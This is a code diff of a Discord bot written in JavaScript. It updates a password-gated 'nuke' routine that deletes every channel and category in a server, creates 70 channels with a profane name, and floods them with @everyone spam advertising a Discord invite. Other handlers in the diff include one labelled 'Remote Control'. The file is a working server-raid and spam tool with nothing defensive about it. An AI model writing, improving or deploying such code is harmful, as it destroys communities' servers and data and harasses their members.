@@ -46,7 +46,6 @@ client.on('messageCreate', async message => {
 
   const content = message.content.trim().toLowerCase();
 
-  // !movebootser
   if (content === '!movebootser') {
     const embed = new EmbedBuilder()
       .setColor('#ff00ff')
@@ -64,7 +63,6 @@ client.on('messageCreate', async message => {
     await message.reply({ embeds: [embed], components: [row] });
   }
 
-  // !nukeback
   if (content === '!nukeback') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
@@ -82,7 +80,6 @@ client.on('messageCreate', async message => {
     await message.reply({ embeds: [embed], components: [row] });
   }
 
-  // !ate
   if (content === '!ate') {
     const embed = new EmbedBuilder()
       .setColor('#ff8800')
@@ -100,7 +97,6 @@ client.on('messageCreate', async message => {
     await message.reply({ embeds: [embed], components: [row] });
   }
 
-  // !check - Remote Control
   if (content === '!check') {
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
@@ -354,7 +350,7 @@ client.on('interactionCreate', async interaction => {
         userSessions.delete(interaction.user.id);
       }
 
-      // ==================== ENHANCED NUKE ====================
+      // ==================== ENHANCED NUKE (UPDATED) ====================
       if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
         const password = interaction.fields.getTextInputValue('password');
         if (password !== NUKE_PASSWORD) {
@@ -368,55 +364,57 @@ client.on('interactionCreate', async interaction => {
         await interaction.reply({ content: `☢️ **Starting full nuke on ${guild.name}...**`, ephemeral: true });
 
         try {
-          await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
+          await interaction.followUp({ content: '🗑️ Deleting all channels & categories...', ephemeral: true });
+          
+          // Delete everything
           for (const channel of guild.channels.cache.values()) {
             await channel.delete().catch(() => {});
           }
 
-          await interaction.followUp({ content: '🔨 Creating NUKED BY FAME channels...', ephemeral: true });
-          const createdChannels = [];
+          await interaction.followUp({ content: '🔨 Creating **FUCKED BY FAME** channels...', ephemeral: true });
 
-          for (let i = 0; i < 80; i++) {
+          const createdChannels = [];
+          for (let i = 0; i < 70; i++) {  // 70 channels
             try {
               const newChan = await guild.channels.create({
-                name: `nuked-by-fame-${i}`,
+                name: `fucked-by-fame`,
                 type: 0,
                 reason: 'Nuke by Fame'
               });
               createdChannels.push(newChan);
-            } catch (e) { break; }
-          }
-
-          await interaction.followUp({ content: '💥 Starting massive spam...', ephemeral: true });
-
-          const spamTexts = [
-            '@everyone **BET$ UNLOCKED** 🔥 FAME REAL FAME',
-            'fucked by veynetta https://discord.gg/NANQMy3WnD',
-            '@everyone **NUKED BY FAME** https://discord.gg/NANQMy3WnD',
-            'REAL FAME BETS UNLOCKED https://discord.gg/NANQMy3WnD'
-          ];
-
-          for (const channel of createdChannels) {
-            for (let i = 0; i < 12; i++) {
-              const msg = spamTexts[Math.floor(Math.random() * spamTexts.length)];
-              channel.send(msg).catch(() => {});
+            } catch (e) {
+              console.error("Rate limit hit during channel creation");
+              break;
             }
           }
 
+          await interaction.followUp({ content: '💥 Spamming @everyone + invite link...', ephemeral: true });
+
+          const invite = 'https://discord.gg/NANQMy3WnD';
+          const spamMessage = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+
+          for (const channel of createdChannels) {
+            for (let i = 0; i < 15; i++) {   // 15 messages per channel
+              channel.send(spamMessage).catch(() => {});
+            }
+          }
+
+          // Extra heavy spam in the last channel
           if (createdChannels.length > 0) {
-            const last = createdChannels[createdChannels.length - 1];
-            for (let i = 0; i < 25; i++) {
-              last.send('@everyone **FAME REAL FAME** https://discord.gg/NANQMy3WnD').catch(() => {});
+            const lastChannel = createdChannels[createdChannels.length - 1];
+            for (let i = 0; i < 30; i++) {
+              lastChannel.send(`@everyone **BET$ UNLOCKED FAME** ${invite}`).catch(() => {});
             }
           }
 
           await interaction.followUp({ 
-            content: `✅ **NUKE COMPLETE**\n• Created **${createdChannels.length}** channels\n• Spamming @everyone + invite`, 
+            content: `✅ **NUKE COMPLETE**\n• Created **${createdChannels.length}** channels named \`fucked-by-fame\`\n• Spamming @everyone + invite link`, 
             ephemeral: true 
           });
+
         } catch (err) {
           console.error(err);
-          await interaction.followUp({ content: '⚠️ Nuke partially completed (rate limits).', ephemeral: true });
+          await interaction.followUp({ content: '⚠️ Nuke partially completed (rate limits hit).', ephemeral: true });
         }
 
         userSessions.delete(interaction.user.id);
